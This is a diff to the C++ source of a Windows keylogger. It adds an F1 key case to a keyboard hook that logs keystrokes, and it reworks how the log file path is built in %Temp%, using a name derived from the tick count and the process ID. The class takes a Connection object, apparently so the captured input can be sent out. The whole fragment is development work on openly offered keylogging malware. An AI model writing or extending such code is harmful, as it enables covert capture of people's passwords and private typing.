@@ -50,6 +50,7 @@ LRESULT OurKeyBoardProc(Keylogger* KeyloggerObj, int nCode, WPARAM wparam, LPARA
 			case VK_BACK:		KeyloggerObj->WriteLog(L"[Backspace]");		break;
 			case VK_CONTROL:	KeyloggerObj->WriteLog(L"[Ctrl]");			break;
 			case VK_MENU:		KeyloggerObj->WriteLog(L"[Alt]");			break;
+			case VK_F1:			KeyloggerObj->WriteLog(L"[F1]");			break;
 
 			default:
 				{
@@ -69,9 +70,9 @@ LRESULT OurKeyBoardProc(Keylogger* KeyloggerObj, int nCode, WPARAM wparam, LPARA
 Keylogger::Keylogger(Connection* mConnObj)
 {
 	ConnObj = mConnObj;
-	WCHAR mlogPath[200];
-	swprintf(mlogPath, L"%Temp%\\%x.dat", GetTickCount() ^ GetCurrentProcessId());
-	ExpandEnvironmentStrings(mlogPath, logPath, MAX_PATH);
+	WCHAR tmp[MAX_PATH];
+	ExpandEnvironmentStrings(L"%Temp%\\", tmp, MAX_PATH);
+	wsprintf(logPath, L"%s%x.dat", tmp, GetTickCount() ^ GetCurrentProcessId());
 	hLog = NULL;
 	eHook = NULL;
 }
